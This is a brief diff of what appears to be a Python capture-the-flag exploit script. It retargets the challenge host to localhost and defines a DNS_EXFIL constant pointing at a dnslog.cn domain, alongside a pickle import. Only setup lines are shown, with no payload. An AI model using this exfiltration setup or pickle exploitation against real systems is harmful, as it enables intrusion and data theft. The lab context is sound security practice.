@@ -1,6 +1,6 @@
 import pickle, os, requests, time
 
-HOST, PORT = "94.237.53.58", 53780
+HOST, PORT = "127.0.0.1", 1337
 CHALLENGE_URL = f"http://{HOST}:{PORT}"
 DNS_EXFIL = "476bdo.dnslog.cn"
 
